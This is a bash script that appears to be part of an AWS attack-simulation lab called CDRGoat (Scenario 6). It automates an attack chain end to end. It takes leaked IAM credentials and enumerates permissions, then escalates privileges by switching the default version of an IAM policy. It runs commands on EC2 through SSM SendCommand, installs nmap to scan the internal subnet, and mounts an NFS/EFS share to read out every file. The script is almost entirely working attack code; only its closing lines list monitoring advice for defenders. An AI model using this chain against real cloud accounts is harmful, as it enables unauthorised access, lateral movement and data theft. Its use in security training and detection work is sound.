#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 6               ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Configuring AWS credentials\n"
  printf "  • Step 2. Permission enumeration for leaked credentials\n"
  printf "  • Step 3. Inspecting IAM policies for compromised user\n"
  printf "  • Step 4. Switching between policy versions to gain command execution\n"
  printf "  • Step 5. Internal network reconnaissance with Nmap\n"
  printf "  • Step 6. Mounting and exploring the discovered NFS share and exfiltrating sensitive data\n"
  
}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in aws curl jq zip; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
#############################################
# Step 1. Configuring AWS credentials
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring AWS credentials to use awscli  ===" "${RESET}"
is_valid_keys() {
  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
  local rc=0 out

  # 1) Ensure no env creds override our profile
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
  PROFILE="streamgoat-scenario-6"

  # 2) Write creds to a dedicated profile (avoid clobbering 'default')
  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
  aws configure set region                "$region" --profile "$PROFILE"

  # 3) Force the call to use our profile
  spin_start "Validating credentials via STS"
  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
  spin_stop

  if [ "$rc" -ne 0 ]; then
    return 1
  fi

  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"

  return 0
}

step "Starting point configuration"
while :; do
  read -r -p "Enter leaked AWS key: " AWSKEY_USER
  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
    break
  else
    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
  fi
done
printf "\n"
read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
printf "This scenario demonstrates IAM policy versioning abuse combined\n"
printf "with SSM lateral movement and NFS data exfiltration.\n\n"

#############################################
# Step 2. Permission enumeration for leaked credentials
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"

# init colors (portable)

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  else
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  fi
}

# Identity/context
try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
try "IAM List Roles"  aws iam list-roles --profile "$PROFILE"

# Inventory
try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances" aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"          aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"        aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"

printf "\nOK, it seems our permissions are quite limited. Let's try to get some more info about our user...\n"
printf "\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Most services returned [DENY] - appears to be restricted.\n\n"
printf "However, examining IAM policy details may reveal:\n"
printf "  • Policy versions with different permissions\n"
printf "  • Escalation paths through IAM itself\n\n"

#############################################
# Step 3. Inspecting IAM policies for compromised user
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Inspecting IAM policies for compromised user  ===" "${RESET}"

# 1. Get current IAM username
USERNAME=$(aws iam get-user --profile "$PROFILE" --query 'User.UserName' --output text 2>/dev/null)
if [ -z "$USERNAME" ]; then
  err "Unable to determine username (iam:GetUser failed?)"
  exit 1
fi
ok "Identified user: ${YELLOW}${USERNAME}${RESET}"

# 2. List inline policies
info "Inline policies attached to $USERNAME:"
INLINE_POLICY_NAMES=$(aws iam list-user-policies --user-name "$USERNAME" --profile "$PROFILE" --query 'PolicyNames' --output text 2>/dev/null)
if [ -n "$INLINE_POLICY_NAMES" ]; then
  echo "$INLINE_POLICY_NAMES" | tr '\t' '\n'
else
  info "(none)"
fi

# 3. Dump inline policy documents (if any)
if [ -n "$INLINE_POLICY_NAMES" ]; then
  for policy in $INLINE_POLICY_NAMES; do
    info "Retrieving inline policy document: $policy"
    aws iam get-user-policy --user-name "$USERNAME" --policy-name "$policy" --profile "$PROFILE" --output json | jq || err "Access denied"
  done
fi

# 4. List managed policies
info "Managed (attached) policies for $USERNAME:"
ATTACHED_POLICY_ARNs=$(aws iam list-attached-user-policies \
  --user-name "$USERNAME" --profile "$PROFILE" \
  --query 'AttachedPolicies[*].PolicyArn' --output text 2>/dev/null)

if [ -n "$ATTACHED_POLICY_ARNs" ]; then
  for arn in $ATTACHED_POLICY_ARNs; do
    name=$(basename "$arn")
    ok "Attached policy: ${YELLOW}${name}${RESET}"
    # Optional: list versions
    versions=$(aws iam list-policy-versions --policy-arn "$arn" --profile "$PROFILE" --query 'Versions[*].VersionId' --output text | tr '\t' ' ')
    info "Available versions for ${name}: ${YELLOW}$versions${RESET}"

    default=$(aws iam get-policy --policy-arn "$arn" --profile "$PROFILE" --query 'Policy.DefaultVersionId' --output text)
    info "Default version: ${YELLOW}${default}${RESET}"

    # Optional: download and show default version
    aws iam get-policy-version \
      --policy-arn "$arn" \
      --version-id "$default" \
      --profile "$PROFILE" \
      --output json | jq '.PolicyVersion.Document'
    printf "\n"
    read -r -p "Looks interesting. We have more than one version of attached policy and have permissions to switch. Lets check configuration of other versions. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

    # Loop over versions, skipping the default
    for ver in $versions; do
      if [ "$ver" != "$default" ]; then
        info "Dumping document for version $ver"
        aws iam get-policy-version \
          --policy-arn "$arn" \
          --version-id "$ver" \
          --profile "$PROFILE" \
          --output json | jq '.PolicyVersion.Document'
      fi
    done

  done
else
  info "(none)"
fi
printf "\nBased on what we see above we may switch to version 2, get the list of EC2, and using version 3 executing commands on them. Lets try...\n"
printf "\n"
read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We discovered IAM policy version abuse opportunity.\n\n"
printf "AWS policies can have up to 5 versions. With ${MAGENTA}SetDefaultPolicyVersion${RESET},\n"
printf "we can switch to a more privileged version:\n"
printf "  • v1 (current): Limited permissions\n"
printf "  • v2: Includes EC2 DescribeInstances\n"
printf "  • v3: Includes SSM SendCommand\n\n"

#############################################
# Step 4. Switching between policy versions to gain command execution
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 4. Escalation via policy version switching  ===" "${RESET}"

# Attached policy ARN (we already fetched earlier in step 3 loop)
# If you stored it in $arn, reuse it; otherwise resolve here:
POLICY_ARN=$(aws iam list-attached-user-policies \
  --user-name "$USERNAME" \
  --profile "$PROFILE" \
  --query 'AttachedPolicies[0].PolicyArn' \
  --output text)

info "Target policy: $POLICY_ARN"

# 1) Switch to v2
step "Switching policy to v2"
aws iam set-default-policy-version \
  --policy-arn "$POLICY_ARN" \
  --version-id v2 \
  --profile "$PROFILE"
ok "Now using v2"

sleep 10

# 2) Enumerate EC2 instances with name tag starting StreamGoat
step "Enumerating EC2 instances"
EC2_IDS=$(aws ec2 describe-instances \
  --filters "Name=tag:Name,Values=StreamGoat-*" "Name=instance-state-name,Values=running" \
  --query 'Reservations[].Instances[].InstanceId' \
  --output text \
  --profile "$PROFILE" | tr '\t' ' ')

if [ -n "$EC2_IDS" ]; then
  ok "Found instance(s): $EC2_IDS"
else
  err "No StreamGoat-* EC2 instances found"
fi

# Save one for attack
TARGET_EC2=$(echo "$EC2_IDS" | awk '{print $1}')

# 3) Switch back to v3
step "Switching policy to v3"
aws iam set-default-policy-version \
  --policy-arn "$POLICY_ARN" \
  --version-id v3 \
  --profile "$PROFILE"
ok "Now using v3"

sleep 10

# 4) Try executing command via SSM (should fail under v3, but attacker tests)
step "Attempting SSM command execution on $TARGET_EC2"
CMD_ID=$(aws ssm send-command \
  --targets "Key=instanceIds,Values=$TARGET_EC2" \
  --document-name "AWS-RunShellScript" \
  --comment "Privilege escalation test" \
  --parameters 'commands=["id"]' \
  --query 'Command.CommandId' \
  --output text \
  --profile "$PROFILE" 2>/dev/null || true)

if [ -n "$CMD_ID" ] && [ "$CMD_ID" != "None" ]; then
  ok "SSM command sent successfully (CommandId: $CMD_ID)"
  sleep 3
  aws ssm list-command-invocations \
    --command-id "$CMD_ID" \
    --details \
    --profile "$PROFILE" | jq '.CommandInvocations[].CommandPlugins[].Output'
else
  err "SSM command execution failed"
fi

printf "\nGood result! No we can pivot into the network and try to collect information about local network.\n"
printf "\n"
read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We switched policy versions to escalate privileges:\n"
printf "  1. Switched to v2 → Gained EC2 DescribeInstances\n"
printf "  2. Switched to v3 → Gained SSM SendCommand\n\n"
printf "SSM allows command execution without SSH access,\n"
printf "bypassing network security controls.\n\n"

#############################################
# Step 5. Internal network reconnaissance with Nmap
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Internal subnet scanning with Nmap ===" "${RESET}"

# 1. Determine local subnet (via SSM command)
step "Detecting EC2 local subnet"
CMD_ID_SUBNET=$(aws ssm send-command \
  --targets "Key=instanceIds,Values=$TARGET_EC2" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["ip route | grep src | head -n1"]' \
  --comment "Find local subnet" \
  --query 'Command.CommandId' \
  --output text \
  --profile "$PROFILE")

sleep 3

SUBNET_LINE=$(aws ssm list-command-invocations \
  --command-id "$CMD_ID_SUBNET" \
  --details \
  --query 'CommandInvocations[].CommandPlugins[].Output' \
  --output text \
  --profile "$PROFILE")

IP_CIDR=$(echo "$SUBNET_LINE" | awk '{for(i=1;i<=NF;i++) if ($i=="src") print $(i+1)}')
NETWORK=$(echo "$IP_CIDR" | awk -F. '{printf "%s.%s.%s.0/24\n", $1, $2, $3}')

ok "Detected local subnet: ${YELLOW}$NETWORK${RESET}"

# 2. Install nmap
step "Installing nmap on target EC2 instance"
CMD_ID_NMAP=$(aws ssm send-command \
  --targets "Key=instanceIds,Values=$TARGET_EC2" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["apt update -y && apt install -y nmap"]' \
  --comment "Install nmap" \
  --query 'Command.CommandId' \
  --output text \
  --profile "$PROFILE")

sleep 60
ok "Nmap installation command sent"

# 3. Launch Nmap scan on common ports
step "Launching Nmap scan on $NETWORK (common ports)"
printf "${YELLOW}nmap -n -T4 -Pn --open -p 22,80,88,443,445,3389,2049 $NETWORK${RESET}\n"
spin_start "Scanning..."
CMD_ID_SCAN=$(aws ssm send-command \
  --targets "Key=instanceIds,Values=$TARGET_EC2" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["nmap -n -T4 -Pn --open -p 22,80,88,443,445,3389,2049 '$NETWORK'"]' \
  --comment "Run internal recon" \
  --query 'Command.CommandId' \
  --output text \
  --profile "$PROFILE")

# Wait for scan to complete
sleep 60
spin_stop

# Capture Nmap output
SCAN_OUTPUT=$(aws ssm list-command-invocations \
  --command-id "$CMD_ID_SCAN" \
  --details \
  --query 'CommandInvocations[].CommandPlugins[].Output' \
  --output text \
  --profile "$PROFILE")

echo -e "\n========== RAW NMAP OUTPUT ==========\n"
echo "$SCAN_OUTPUT"
echo -e "\n=====================================\n"

# Find the IP of the host with 2049/tcp open
NFS_HOST=$(echo "$SCAN_OUTPUT" | awk '/Nmap scan report for/ {ip=$5} /2049\/tcp[[:space:]]+open/ {print ip}' | head -n1)

if [ -n "$NFS_HOST" ]; then
  ok "Detected NFS host: ${YELLOW}$NFS_HOST${RESET}"
else
  err "No host found with port 2049 open. Exiting."
  exit 1
fi
printf "\n"
read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We performed internal network reconnaissance via SSM.\n\n"
printf "Installed nmap and scanned the subnet for interesting services.\n"
printf "Found host with port 2049 open (${MAGENTA}NFS${RESET})!\n\n"
printf "NFS/EFS often contains sensitive data with weak access controls.\n\n"

#############################################
# Step 6. Mount and explore discovered NFS share
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Mounting NFS and dumping files ===" "${RESET}"

# Use the IP discovered with port 2049 open
MOUNT_DIR="/mnt/nfs"

# 1. Mount the NFS share
step "Mounting NFS share from $NFS_HOST"

CMD_ID_MOUNT=$(aws ssm send-command \
  --targets "Key=instanceIds,Values=$TARGET_EC2" \
  --document-name "AWS-RunShellScript" \
  --parameters "commands=[\"mkdir -p $MOUNT_DIR && mount -t nfs4 -o nfsvers=4.1 $NFS_HOST:/ $MOUNT_DIR\"]" \
  --comment "Mount NFS share" \
  --query 'Command.CommandId' \
  --output text \
  --profile "$PROFILE")

sleep 5
ok "NFS mount command sent"

# 2. List directory contents
step "Listing contents of NFS share at $MOUNT_DIR"
CMD_ID_LIST=$(aws ssm send-command \
  --targets "Key=instanceIds,Values=$TARGET_EC2" \
  --document-name "AWS-RunShellScript" \
  --parameters "commands=[\"ls -la $MOUNT_DIR\"]" \
  --comment "List NFS files" \
  --query 'Command.CommandId' \
  --output text \
  --profile "$PROFILE")

sleep 3

LISTING=$(aws ssm list-command-invocations \
  --command-id "$CMD_ID_LIST" \
  --details \
  --query 'CommandInvocations[].CommandPlugins[].Output' \
  --output text \
  --profile "$PROFILE")

echo -e "\n${GREEN}[+] Directory listing of $MOUNT_DIR:${RESET}\n"
echo "$LISTING"

# 3. Find file names and dump content of each
FILENAMES=$(echo "$LISTING" | awk '{print $9}' | grep -v '^\.$' | grep -v '^\.\.$' | grep -v '^total' | grep -v '^$')

for file in $FILENAMES; do
  step "Reading file: $file"
  CMD_ID_READ=$(aws ssm send-command \
    --targets "Key=instanceIds,Values=$TARGET_EC2" \
    --document-name "AWS-RunShellScript" \
    --parameters "commands=[\"cat $MOUNT_DIR/$file\"]" \
    --comment "Read file $file" \
    --query 'Command.CommandId' \
    --output text \
    --profile "$PROFILE")
  
  sleep 2

  FILE_CONTENT=$(aws ssm list-command-invocations \
    --command-id "$CMD_ID_READ" \
    --details \
    --query 'CommandInvocations[].CommandPlugins[].Output' \
    --output text \
    --profile "$PROFILE")

  echo -e "\n${YELLOW}[FILE: $file]${RESET}\n$FILE_CONTENT\n"
done

printf "We got access to sensitive data stored in internal EFS.\n"

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Validated leaked IAM user credentials\n"
printf "  2. Discovered IAM policy with multiple versions\n"
printf "  3. Switched to v2 → Gained EC2 DescribeInstances\n"
printf "  4. Switched to v3 → Gained SSM SendCommand\n"
printf "  5. Network reconnaissance via nmap (found NFS on port 2049)\n"
printf "  6. Mounted EFS and exfiltrated sensitive data\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Access to sensitive data on internal EFS\n"
printf "  • IAM policy version abuse for privilege escalation\n"
printf "  • SSM-based lateral movement\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • SetDefaultPolicyVersion API calls\n"
printf "  • SSM command executions (especially nmap, mount)\n"
printf "  • NFS/EFS mount activity from unexpected instances\n"
printf "  • Policy version changes in CloudTrail\n\n"

printf "\n"
read -r -p "Scenario 6 completed. Press Enter to finish..." _ || true
